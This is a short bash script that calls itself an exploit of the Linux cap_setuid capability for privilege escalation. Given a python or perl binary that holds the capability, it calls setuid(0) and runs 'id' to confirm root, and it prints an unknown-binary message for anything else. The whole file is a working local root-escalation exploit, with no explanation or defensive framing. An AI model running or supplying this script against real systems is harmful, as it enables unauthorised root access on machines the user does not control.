#!/bin/bash
# Exploit cap_setuid capability on a binary for privilege escalation
# Usage: cap_setuid.sh <binary_path>
set -euo pipefail

BIN="${1:-}"

case "$BIN" in
    *python*) "$BIN" -c 'import os; os.setuid(0); os.system("id")' ;;
    *perl) "$BIN" -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "id";' ;;
    *) echo "CAP_UNKNOWN_BINARY: $BIN" ;;
esac
